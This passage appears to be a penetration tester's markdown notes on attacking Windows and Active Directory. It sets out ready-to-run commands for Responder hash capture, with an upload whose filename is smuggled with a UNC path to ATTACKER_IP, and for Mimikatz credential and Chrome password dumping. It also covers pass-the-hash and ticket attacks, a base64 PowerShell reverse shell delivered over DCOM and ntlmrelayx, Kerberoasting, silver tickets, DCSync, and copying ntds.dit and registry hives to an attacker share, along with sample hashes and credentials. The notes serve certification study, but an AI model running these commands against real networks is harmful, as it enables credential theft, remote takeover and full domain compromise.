+Note: In addition to SMB, [Responder](https://github.com/lgandx/Responder) also includes other protocol servers (including HTTP and FTP) as well as poisoning capabilities for Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS).
+
+```sh
+# start Responder
+# if your victim is Windows XP/Server 2003 or earlier, add '--lm' flag
+sudo responder -I tun0
+# verify it shows:
+# SMB server    [ON]
+```
+
+Once you have Responder's SMB server listening, you can force your victim to authenticate to you in several ways:
+
+- With remote code execution, run `net use \\ATTACKER_IP\derp` or (PowerShell) `ls \\ATTACKER_IP\derp`.
+- With ability to upload files to victim web server, **enter a non-existing file with a UNC path** like `\\ATTACKER_IP\derp\nonexistent.txt`
+	- To do this, capture a normal upload with Burp, then change the "filename" field to have a UNC path. **Use double-backslashes!!** (i.e. `filename="\\\\192.168.45.192\\derp\\secrets.txt"`)
+	- Here's how to do it with curl:
+
+```sh
+# Malicious file upload to non-existent UNC path, triggering NTLMv2 auth with Responder
+# Change 'myFile' to the file's form-field name.
+# The '@-' tells curl to take the file content from stdin,
+# which is just the 'echo derp' output.
+# Adding the ';filename=' coerces curl to set your custom filename in the form post
+# Remember, you must use double-backslashes to escape them properly!!!
+# '-x' arg passes your curl payload to Burp proxy for inspection
+echo derp | curl -s -x "http://127.0.0.1:8080" -F 'myFile=@-;filename=\\\\ATTACKER_IP\\derp\\derp.txt' "http://VICTIM_IP/upload" 
+```
+
+After the victim tries to authenticate to the Responder SMB server, you should see it display the NTLMv2 hash that it captured during the handshake process:
+
+```
+...
+[+] Listening for events... 
+[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
+[SMB] NTLMv2-SSP Username : FILES01\paul
+[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 
+```
+
+Copy the hash and save it to a file. Then crack it with hydra/john:
+
+```sh
+hashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt --force
+```
+
+When you can't crack an NTLMv2 hash that you were able to capture with Responder, you can relay it to another machine for access/RCE (assuming it's an admin hash, and Remote UAC restrictions are disabled on the target). If this works, you get instant SYSTEM on the remote machine.
+
+```sh
+# '-c' flag is command to run
+# here we are generating a powershell reverse shell one-liner
+# as base64-encoded command
+sudo impacket-ntlmrelayx -t VICTIM_IP --no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n')"
+
+# start a netcat listener to catch the reverse shell
+sudo nc -nvlp 443
+```
+
+### URI File Attack
+
+As this is a Windows host, we can use the SMB share access to upload a file that the target system will interpret as a Windows shortcut. In this file, we can specify an icon that points to our Kali host. This should allow us to capture the user's NTLM hash when it is accessed.
+
+We'll create a file named **@hax.url** with the following contents.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ cat @hax.url 
+[InternetShortcut]
+URL=anything
+WorkingDirectory=anything
+IconFile=\\192.168.118.14\%USERNAME%.icon
+IconIndex=1
+```
+
+When a user accesses this file, it will attempt to load the icon. This will cause a request to our Kali host for a file named with the user account's username. This request should also contain the NTLM hash of this account.
+
+Before uploading the file to the SMB share, let's start `responder` to listen for the request.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo responder -I tap0 -v
+...
+[+] Listening for events...
+...
+```
+
+Next, let's upload our file.
+
+```
+...
+smb: \> put @hax.url 
+putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)
+smb: \> quit
+
+┌──(kali㉿kali)-[~]
+└─$
+```
+
+After a little while, `responder` captures a hash.
+
+```
+...
+[SMB] NTLMv2-SSP Client   : 192.168.120.116
+[SMB] NTLMv2-SSP Username : VAULT\anirudh
+[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:9def1316e1c05550:0AF01C475AFD7AD30D439711296603FC:010100000000000000C8C8F445DDD70175319E0B50E5D26C0000000002000800410031005900380001001E00570049004E002D004C00580033003800430030004B004C00350047005A0004003400570049004E002D004C00580033003800430030004B004C00350047005A002E0041003100590038002E004C004F00430041004C000300140041003100590038002E004C004F00430041004C000500140041003100590038002E004C004F00430041004C000700080000C8C8F445DDD7010600040002000000080030003000000000000000010000000020000024B3687DE76994B1C5B750504A62A0055473E634299355A166AE72D58CD7F8660A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100310038002E00310034000000000000000000 
+```
+
+Nice, we successfully obtained the NTLM hash for a user named `anirudh`.
+## Mimikatz
+
+
+```powershell
+
+Invoke-WebRequest -Uri 192.168.45.230/windowsprivesc/mimikatz.exe -OutFile mimikatz.exe
+certutil -urlcache -split -f http://192.168.49.106/windowsprivesc/mimikatz.exe mimikatz.exe
+
+.\mimikatz.exe
+# start logging session to file
+log \\ATTACKER_IP\share\mimikatz.log
+# enable full debug privileges to have access to system memory
+privilege::debug
+# elevate to system
+token::elevate
+# get hashes and try to print plaintext passwords
+sekurlsa::logonpasswords
+# dump hashes from SAM
+lsadump::sam
+# list all available kerberos tickets
+sekurlsa::tickets
+# List Current User's kerberos tickets
+kerberos::list
+# tries to extract plaintext passwords from lsass memory
+sekurlsa::wdigest
+# Get just the krbtgt kerberos tikcket
+sekurlsa::krbtgt
+
+# get google chrome saved credentials
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
+If **LSA Protection** is enabled (default starting with Windows 8.1), this hampers your ability to collect hashes without first bypassing it.
+
+```powershell
+# check if LSA Protection enabled (key set to 1 or 2)
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
+```
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+AS_REQ During initial authentication (logging into workstation) DC  acting as KDC, receives the AS-REQ with a timestamp, encrypted from the password of the user and the username.  
+  
+AD receives the request, verifies the password hash (in ntds.dit) and decrypt the timestamp, then it is succesfull.  
+  
+AD responds with an AS-REP, this contains the session key and a ticket granting ticket, the session key is encrypted with the users password hash and can be decrypted by the user (or any app that has the password hash of the user), the Ticket granting ticket contains info about the user, domain, timestamp, ip address, and session key. It is actually encrypted with the NTLM hash of the krbtgt account only known to the KDC and cannot be decrypted.  
+  
+After AS-REQ and AS-REP the client is authenticated. And TGT is valid for ten hours.  
+  
+Now the user want to access a network share, it contacts the TGT with a TGS-REQ, this contains the user, timestamp encrypted with the session key, name of the resource and encrypted TGT.  
+  
+The KDC receives the TGS-REQ and the TGT is decrypted using the password of the krbtgt account (NTLM HASH), the session key is extracted from the TGT and used to decypt the username and timestamp, this it performs checks for a valid timestamp, the username , and the IP address.  
+  
+After a succesfull TGS-REQ the KDC will provide a TGS-REP which include, the name of the service, the session key, and a service ticket that contains the username and group membership and session key. The service tickets service name and session key are encrypted using the session key associated with the creation of the TGT.  The service ticket is encrypted with the password hash of the service account registered with the service in question.  
+  
+Now armed with the session key and service ticket provided by the TGS-REP authentication begins with the service  
+  
+The client sends the application server an AP-REQ, this includes the username, timestamp encrypted with the session key associated with the service ticket along with the service ticket. The application server decrypts the service ticket using the service account password hash and extracts the username and session key. It then decypts the username from the AP-REQ and permissions must match - then the user is allowed to access the service.
+
+
+# Active Directory Enumeration
+
+### Simple Script
+
+When you start your internal pentest, these are the first modules you should try:
+
+```sh
+# Zerologon
+crackmapexec smb DC_IP -u '' -p '' -M zerologon
+
+# PetitPotam
+crackmapexec smb DC_IP -u '' -p '' -M petitpotam
+
+# NoPAC (requires credentials)
+crackmapexec smb DC_IP -u 'user' -p 'pass' -M nopac
+
+# LAPS 
+crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
+
+
+```
+
+
+This script will provide a quick listing of all computers, users, service
+accounts, groups and memberships on an Active Directory domain.
+
+This script was adapted from one written by Cones, who modified the example code provided in the PWK course materials.
+
+```powershell
+$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
+$dn=([adsi]'').distinguishedName
+$p=("LDAP://"+$pdc.Name+"/"+$dn);
+$d=New-Object System.DirectoryServices.DirectoryEntry($p)
+$s=New-Object System.DirectoryServices.DirectorySearcher($d)
+write-host "==========    PRIMARY DC    ==========";
+$pdc|select Name,IPAddress,OSVersion,SiteName,Domain,Forest|format-list
+write-host "==========    COMPUTERS    ==========";
+$s.filter="(objectCategory=computer)";$s.FindAll()|?{write-host $_.Path};
+write-host "==========    USERS    ==========";
+$s.filter="(objectCategory=person)";$s.FindAll()|?{write-host $_.Path};
+write-host "==========    SERVICES    ==========";
+$s.filter="(serviceprincipalname=*)";$s.FindAll()|?{write-host $_.Path};
+write-host "==========    GROUPS    ==========";
+$s.filter="(objectCategory=group)";$s.FindAll()|?{write-host $_.Path};
+write-host "==========    MEMBERSHIP    ==========";
+function _r {
+  param($o,$m);
+  if ($o.Properties.member -ne $null) {
+    $lm=[System.Collections.ArrayList]@();
+    $o.Properties.member|?{$lm.add($_.split(",")[0].replace("CN=",""))};
+    $lm=$lm|select -unique;
+    $m.add((New-Object psobject -Property @{
+      OU = $o.Properties.name[0]
+      M = [string]::Join(", ",$lm)
+    }));
+    $lm | ?{
+      $s.filter=[string]::Format("(name={0})",$_);
+      $s.FindAll()|?{_r $_ $m | out-null};
+    }
+  }
+}
+$m=[System.Collections.ArrayList]@();
+$s.FindAll()|?{_r $_ $m | out-null};
+$m|sort-object OU -unique|?{write-host ([string]::Format("[OU] {0}: {1}",$_.OU,$_.M))};
+```
+
+Here's a quick script to list the local administrators of all hosts in a domain:
+
+```powershell
+$LocalGroup = 'Administrators'
+$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
+$dn=([adsi]'').distinguishedName
+$p=("LDAP://"+$pdc.Name+"/"+$dn);
+$d=New-Object System.DirectoryServices.DirectoryEntry($p)
+$s=New-Object System.DirectoryServices.DirectorySearcher($d)
+$s.filter="(objectCategory=computer)"
+$computers=$s.FindAll()|%{$_.Properties.cn}
+foreach ($c in $computers) {
+  echo "`r`n==========   $c   =========="
+  try {
+    $grp=[ADSI]("WinNT://$c/$LocalGroup,Group")
+    $mbrs=$grp.PSBase.Invoke('Members')
+    $mbrs|%{$_.GetType().InvokeMember('Name','GetProperty',$null,$_,$null)}
+  } catch {
+    echo "[x] ERROR retrieving group members"
+    continue
+  }
+}
+```
+
+###  PowerView
+
+Usage (some commands may take a minute or two to complete):
+
+```powershell
+#download
+certutil -urlcache -split -f http://192.168.45.230/windowsprivesc/PowerView.ps1 powerview.ps1
+
+# list of all usernames with last logon and password set times
+Get-NetUser | select samaccountname,pwdlastset,lastlogon, objectsid
+
+# list of all service accounts, or Service Principal Names (SPNs)
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+
+# convert SID to name (useful for translating Get-ObjectAcl output)
+Convert-SidToName SID
+
+# list of all group names
+Get-NetGroup | select samaccountname,description
+
+# all members of specific group
+Get-DomainGroupMember "Domain Admins" | select membername
+
+# list all computers
+Get-DomainComputer | select dnshostname,operatingsystem,operatingsystemversion
+# get all IP addresses and hostnames
+resolve-ipaddress @(Get-DomainComputer|%{$_.dnshostname})
+
+# finds machines on the local domain where the current user has local administrator access
+Find-LocalAdminAccess
+
+Find-DomainShare -CheckShareAccess|fl # only list those we can access
+# finds domain machines where specific users are logged into
+
+# finds domain machines where specific processes are currently running
+Find-DomainProcess
+
+
+```
+
+**Convert SID to name.**
+```shell
+# Import the .NET assembly for SecurityIdentifier
+
+Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+
+# Get the SecurityIdentifier and ActiveDirectoryRights
+
+$acl = Get-ObjectAcl -Identity "Management Department" | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object SecurityIdentifier, ActiveDirectoryRights
+
+# Convert SecurityIdentifier to name using the Translate method
+
+$acl | ForEach-Object {
+
+    $sid = $_.SecurityIdentifier
+
+    $translatedName = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value
+
+    # Output the translated name along with other properties
+
+    $_ | Add-Member -MemberType NoteProperty -Name "TranslatedName" -Value $translatedName -Force
+
+    $_
+
+}
+```
+
+**Find all accesses my SID has to GenericAll for every object**
+```shell
+Get-DomainObjectAcl -Domain medtech.com | ? { $_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-2610934713-1581164095-2706428072-1105" }
+
+#list all of the below rights
+$desiredRights = "GenericAll","GenericWrite","WriteOwner","WriteDACL","AllExtendedRights","ForceChangePassword","Self"
+Get-DomainObjectAcl -Domain medtech.com | Where-Object { $_.ActiveDirectoryRights -in $desiredRights -and $_.SecurityIdentifier -match "S-1-5-21-976142013-3766213998-138799841-1110" }
+
+```
+
+### ADpeas
+
+```shell
+certutil -urlcache -split -f http://192.168.49.106/windowsprivesc/adPEAS.ps1 adpeas.ps1
+
+. .\adpeas.ps1
+Invoke-adPEAS
+
+```
+
+### BloodHound
+
+On the attacker machine:
+
+```sh
+# start the neo4j server
+sudo neo4j start
+
+# browse to neo4j webUI to configure a password
+firefox http://localhost:7474
+# log in with neo4j:neo4j
+# and change password to whatever you want (remember for later!)
+
+# now that neo4j is running, start bloodhound
+bloodhound
+# configure it to log into local neo4j server using approriate URL and creds
+# URL: bolt://localhost:7687
+```
+
+
+```
+MATCH (m:Computer) RETURN m
+MATCH (m:User) RETURN m
+
+MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
+
+```
+
+Or use bloodhound custom queries here: [Bloodhound-Custom-Queries/customqueries.json at master · hausec/Bloodhound-Custom-Queries](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json) 
+# Lateral Movement in Active Directory
+
+### PsExec on Active Directory
+
+PsExec allows you to run remote processes as a child of a Windows service process, meaning you get SYSTEM privileges.
+
+**Prerequisites: The user that authenticates to the target machine needs to be part of the *Administrators* local group. In addition, the _ADMIN$_ share must be available and File and Printer Sharing must be turned on (this is default).**
+
+Using `impacket-psexec` from Kali, pass-the-hash is possible:
+
+```sh
+#pass the ntlm hash to get a remote shell (believe it needs to be admin) possibly put domain/joe if does not work 
+impacket-psexec -hashes 00000000000000000000000000000000:8b4547a5116dd13e6e206d1286a06b28 Administrator@10.10.80.142
+
+# with password authentication:
+impacket-psexec 'oscp.exam/Administrator:vau!XCKjNQBv2$@172.16.93.21'
+```
+
+Using Sysinternals PsExec for remote interactive session (from windows host):
+
+```powershell
+# interactive shell using sysinternals version of psexec
+./PsExec64.exe -accepteula -i  \\VICTIM -u DOMAIN\ADMINUSER -p PASSWORD cmd
+```
+
+### WMI (135) and WinRM  (5985) on Active Directory
+
+*Windows Management Instrumentation (WMI)* is capable of creating processes via the `Create` method from the `Win32_Process` class. It communicates through *Remote Procedure Calls (RPC)* 
+In order to create a process on the remote target via WMI, we need credentials of a member of the _Administrators_ local group, which can also be a domain user
+
+```sh
+# spawns remote shell as admin user with pass-the-hash
+impacket-wmiexec -hashes :NTHASH ADMINUSER@VICTIM_IP
+
+# Run remote command as Administrator; same syntax as psexec
+impacket-wmiexec -hashes 00000000000000000000000000000000:08d7a47a6f9f66b97b1bae4178747494 medtech/joe@172.16.238.11
+
+# using password authentication
+impacket-wmiexec 'ADMINUSER:PASSWORD@VICTIM_IP'
+```
+
+WinRM is the Microsoft version of the WS-Management protocol, and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP. For WinRM to work, you need plaintext credentials of a domain user who is a member of the Administrators or Remote Management Users group on the target host.
+
+```SHELL
+#if port 5985 is open:
+# -s to include scripts
+evil-winrm -i 172.16.238.11 -u joe -H 08d7a47a6f9f66b97b1bae4178747494 
+```
+
+### Overpass-the-Hash
+
+Overpass-the-hash is when you use an NTLM (or AES256) hash to obtain a Kerberos TGT in an environment where NTLM authentication is not allowed. 
+
+**NOTE**: Because Kerberos relies on domain names, you must use those for any commands instead of IP addresses (set your `/etc/hosts` file).
+
+```powershell
+# using mimikatz
+privilege::debug
+# grab hash:
+sekurlsa::logonpasswords
+# perform overpass-the-hash, starting powershell window as user
+# alternatively, kick off reverse shell
+sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell
+# in new powershell session, interact to get/cache TGT (and TGS):
+net use \\VICTIM
+# inspect that you have TGT now
+klist
+# ready to use this session with creds (see psexec cmd below)
+
+
+# using Rubeus
+# be sure to use format "corp.com" for DOMAIN
+.\Rubeus.exe asktgt /domain:DOMAIN /user:USER /rc4:NTHASH /ptt
+
+
+# now you can use PsExec in context of stolen user
+.\PsExec.exe -accepteula \\VICTIM cmd
+# note, the spawned shell will be under stolen user, not SYSTEM
+```
+
+On Kali, use impacket:
+
+```sh
+# be sure to use format "corp.com" for DOMAIN
+impacket-getTGT -dc-ip DC_IP DOMAIN/USERNAME -hashes :NTHASH # or -aesKey AESKEY
+export KRB5CCNAME=$(pwd)/USERNAME.ccache
+impacket-psexec -k -no-pass DOMAIN/USER@VICTIM_FQDN
+# this spawned shell will (still) be SYSTEM
+# when you can't resolve domain IPs, add -dc-ip DC_IP -target-ip VICTIM_IP
+
+# if you get the error:
+[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)
+# check that the target IP is correct/matches the victim hostname
+
+# USE THIS
+# you can also do overpass-the-hash directly with one command:
+impacket-psexec -k -hashes :NTLM DOMAIN/USER@VICTIM_FQDN
+```
+
+### Pass-the-Ticket
+
+In Pass-the-Ticket, you steal someone else's kerberos ticket from memory and use it to access resources you wouldn't be able to. Stealing a TGS ticket more versatile than a TGT because you can use it on other machines, not just the one you stole it from. This attack is similar to Overpass-the-hash, except you're skipping over the AS-REQ, straight to the part where you have a ticket in hand.
+
+Acquiring tickets with Rubeus:
+
+```powershell
+
+https://github.com/Flangvik/SharpCollection
+
+# from elevated cmd prompt
+# list all tickets in memory
+.\Rubeus.exe triage
+
+# dump desired tickets (base64 encoded .kirbi printed to stdout)
+.\Rubeus.exe dump /nowrap [/luid:LOGINID] [/user:USER] [/service:krbtgt]
+
+# load the ticket into session (copy and paste base64 kirbi data from previous)
+.\Rubeus.exe ptt /ticket:BASE64_KIRBI
+```
+
+Using saved tickets from Kali:
+
+```sh
+# if you have base64 ticket from Rubeus, convert to .kirbi first
+echo -n "BASE64_KIRBI" | base64 -d > USERNAME.kirbi
+
+# convert .kirbi to .ccache
+impacket-ticketConverter USERNAME.kirbi USERNAME.ccache
+
+# export path to .ccache to use with other tools
+export KRB5CCNAME=$(pwd)/USERNAME.ccache
+
+# use with crackmapexec, impacket-psexec/wmiexec/smbexec
+# make sure you set /etc/hosts to reslove FQDN for crackmapexec
+crackmapexec smb --use-kcache VICTIM_FQDN
+impacket-psexec -k -no-pass VICTIM_FQDN
+```
+
+### DCOM
+
+Interaction with DCOM is performed over RPC on TCP port 135 and local **administrator access is required** to call the 
+
+```powershell
+# variable declaration
+$victim = 'VICTIM' # hostname or IP
+$lhost = 'LISTEN_IP'
+$lport = 443
+$revshell = '$client=New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String );$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
+$b64cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($revshell));
+$command = 'powershell -ep bypass -nop -w hidden -enc '+$b64cmd;
+# create the DCOM MMC object for the remote machine
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1",$victim))
+# execute shell command through DCOM object
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,$command,"7")
+# ExecuteShellCommand accepts 4 parameters:
+# Command, Directory, Parameters, and WindowState (7 is hidden).
+```
+
+# Attacking Active Directory Authentication
+
+### AS-REP Roasting (user acct)
+
+AS-REP Roasting is an attack to retrieve a user's password hash that can be brute-forced offline.
+
+Enumerating for users that are AS-REP Roastable:
+
+```powershell
+# Windows: using PowerView
+Get-DomainUser -PreauthNotRequired | select samaccountname
+
+
+impacket-GetNPUsers -dc-ip 172.16.93.6  -request -outputfile hashes.asreproast relia.com/jim
+
+```
+
+Collecting hashes using AS-REP Roast attack:
+
+```powershell
+# Windows: use Rubeus.exe (can use /format:hashcat interchangably)
+.\Rubeus.exe asreproast /format:john /outfile:asreproast.hash
+# push to stdout instead of file
+.\Rubeus.exe asreproast /nowrap
+```
+
+Cracking the AS-REP roast hashes:
+
+```sh
+# using John-the-Ripper (auto-detects krb5asrep format)
+john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.hash
+
+# using hashcat
+hashcat -m 18200 --force -r /usr/share/hashcat/rules/best64.rule asreproast.hash /usr/share/wordlists/rockyou.txt
+```
+
+If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily set their account to disable Preauth, allowing you to AS-REP roast their account. Here's how:
+
+```powershell
+# using Microsoft ActiveDirectory Module
+get-aduser -identity $USERNAME | Set-ADAccountControl -doesnotrequirepreauth $true
+
+# using AD Provider
+$flag = (Get-ItemProperty -Path "AD:\$DISTINGUISHED_NAME" -Name useraccountcontrol).useraccountcontrol -bor 0x400000
+Set-ItemProperty -Path "AD:\$DISTINGUISHED_NAME" -Name useraccountcontrol -Value "$flag" -Confirm:$false
+
+# using ADSI accelerator (legacy, may not work for cloud-based servers)
+$user = [adsi]"LDAP://$DISTINGUISHED_NAME"
+$flag = $user.userAccountControl.value -bor 0x400000
+$user.userAccountControl = $flag
+$user.SetInfo()
+```
+
+### Kerberoasting (serviceacct)
+
+Kerberoasting is an attack to retrieve the password hash of a Service Principal Name (SPN) that can be brute-forced offline.
+
+It is very similar to AS-REP Roasting, except it is attacking SPNs' hashes instead of users'.
+
+Obtaining the SPN Hashes:
+
+```powershell
+# Windows: using PowerView.ps1
+Invoke-Kerberoast | fl
+
+# Windows: using Rubeus
+# '/tgtdeleg' tries to downgrade encryption to RC4
+.\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.hash
+
+#from kali 
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+```
+
+Cracking the kerberoast hashes:
+
+```sh
+# using John-the-Ripper (auto-detects krb5tgs format)
+john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hash
+
+# using hashcat
+hashcat -m 13100 --force -r /usr/share/hashcat/rules/best64.rule kerberoast.hash /usr/share/wordlists/rockyou.txt
+```
+
+If the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the `krbtgt` user account which acts as service account for the KDC.
+
+If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily add/register an SPN to their account, allowing you to kerberoast them.
+
+Once you have the SPN password, you can use it to forge a Silver Ticket. You must first convert it to its NTLM hash, which is simply the MD4 hash of the password.
+
+```python
+import hashlib
+h = hashlib.new("md4", "SPN_PASSWORD".encode("utf-16le")).hexdigest()
+print(h)
+```
+
+
+### Silver Ticket
+
+That means that an attacker with the SPN password (see [Kerberoasting](#5.2.4%20Kerberoasting)) or its NTLM hash can forge a service ticket for any user with whatever group memberships and permissions the attacker desires, and the SPN will commonly blindly trust those permissions rather than verify them with the DC.
+
+We need to collect the following three pieces of information to create a silver ticket:
+
+- SPN password hash (can get with mimikatz when SPN has session on your computer)
+- Domain SID (extract from user SID)
+- Target SPN
+
+Getting prerequisite info:
+
+```powershell
+# use mimikatz to get SPN NTLM hash
+mimikatz.exe
+> privilege::debug
+> sekurlsa::logonpasswords
+
+# extract the Domain SID from the user SID (everything but RID, numbers after last dash)
+whoami /user
+
+# list SPNs from specific host
+setspn -l HOSTNAME
+# example for IIS server: HTTP/web04.corp.com:80
+```
+
+Create silver ticket (you can use any valid username):
+
+```powershell
+# in mimikatz:
+# /ptt - pass the ticket; auto-injects it into memory
+kerberos::golden /sid:S-1-5-... /domain:DOMAIN /ptt /target:SERVER_FQDN /service:http /rc4:NTLM_HASH /user:ADMIN_USER
+
+# TODO: figure out how to do this with Rubeus.exe
+# Rubeus lets you ask for tickets for all services at once:
+# /altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm
+.\Rubeus.exe silver /rc4:NTHASH /user:USERNAME /service:SPN /ldap /ptt [/altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm] [/nofullpacsig] [outfile:FILENAME]
+
+# Kali: get SIDs with crackmapexec
+crackmapexec ldap DC_FQDN -u USERNAME -p PASSWORD -k --get-sid
+
+# Kali: use impacket
+# Service is something like http, cifs, host, ldap, etc. (cifs lets you access files)
+impacket-lookupsid DOMAIN/USERNAME:PASSWORD@VICTIM
+impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN -spn SERVICE/VICTIM_FQDN USERNAME
+export KRB5CCNAME=$(pwd)/USERNAME.ccache 
+impacket-psexec DOMAIN/USERNAME@VICTIM -k -no-pass
+```
+
+Confirm ticket is loaded in memory on Windows host:
+
+```powershell
+# list kerberos tickets available to user
+klist
+
+# make web request with silver ticket
+iwr -UseDefaultCredentials http://VICTIM
+```
+
+Before 11 October 2022, it was possible to forge Silver tickets for nonexistent users. That's no longer the case, due to a security patch that adds the `PAC_REQUESTOR` field to the Privilege Attribute Certificate (PAC) structure. The field contains the username, and it is required to be validated by the DC (when patch is enforced).
+
+# Active Directory Persistence
+
+### 5.4.1 Domain Controller Synchronization (DCSync)
+
+DCSync lets you remotely dump the hashes from a domain controller's `ntds.dit` file.
+
+When multiple DCs are in use for redundancy, AD uses the Directory Replication Service (DRS) Remote Protocol to replicate (synchronize) these redundant DCs (e.g. using `IDL_DRSGetNCChanges` API). The DC receiving the sync request does not check that the request came from a known DC, only that the SID making the request has appropriate privileges.
+
+To launch such a replication, a user needs to have the *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned. If we get access to any user account with these rights, we can impersonate a DC and perform the DCsync attack. The end result is the target DC will send the attacker copies of any data he requests.
+
+Performing dcsync attack:
+
+```powershell
+# From inside mimikatz shell
+# grab all hashes from DC
+lsadump::dcsync
+# grab hashes of specific user
+lsadump::dcsync /user:corp\Administrator
+
+# Kali: use impacket
+# full dump of hashes
+# you can use '-hashes LMHASH:NTHASH' for auth instead of password (or omit LMHASH)
+impacket-secretsdump -just-dc -outputfile dcsync DOMAIN/ADMINUSER:PASSWORD@DC_IP
+# grab specific user's hashes
+impacket-secretsdump -just-dc-user -outputfile dcsync USER DOMAIN/ADMINUSER:PASSWORD@DC_IP
+```
+
+Crack dumped NTLM hashes:
+
+```sh
+❯ hashcat -m 1000 -w3 --force -r /usr/share/hashcat/rules/best64.rule --user dcsync.ntds /usr/share/wordlists/rockyou.txt
+```
+
+
+### 5.4.2 Volume Shadow Copy
+
+Domain Admins can abuse shadow copies to obtain a copy of the `ntds.dit` file (the Active Directory database, containing all user credentials).
+
+A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes. Shadow copies are managed by the binary `vshadow.exe`, part of the Windows SDK. They can also be created using WMI.
+
+```powershell
+# from elevated terminal session:
+
+# create volume shadow copy of C: drive
+# -nw : no writers (to speed up creation)
+# -p : store copy on disk
+vshadow.exe -nw -p  C:
+# pay attention to Shadow copy device name
+# line under * SNAPSHOT ID = {UUID}
+#    - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+
+# create SMB session with hacker machine
+net use \\ATTACKER_IP herpderp /user:derp
+
+# copy the ntds.dit file over to attacker machine (must do in cmd, not PS)
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit \\ATTACKER_IP\share\ntds.dit.bak
+
+# save copy of SYSTEM registry hive onto attacker machine
+# this contains the encryption keys for the ntds.dit file
+reg.exe save hklm\system \\ATTACKER_IP\share\system.hiv
+
+# on Kali, use secretsdump to extract hashes
+impacket-secretsdump -ntds ntds.dit.bak -system system.hiv -outputfile ntds-dump LOCAL
+```
+
+Alternative ways to create shadow copies, plus ways of working with them:
+
+```powershell
+# create shadow copy with wmic:
+wmic shadowcopy call create volume=c:\
+
+# create with PowerShell
+([WMICLASS]"root\cimv2:win32_shadowcopy").create("C:\","ClientAccessible")
+
+# list all volume shadow copies for C: drive
+vssadmin list shadows /for=C:
+
+# list using Powershell (shows date created)
+Get-CimInstance Win32_ShadowCopy | select Name,Caption,Description,ServiceMachine,InstallDate,ID,DeviceObject
+
+# if you want to browse the files in the shadow copy, mount it:
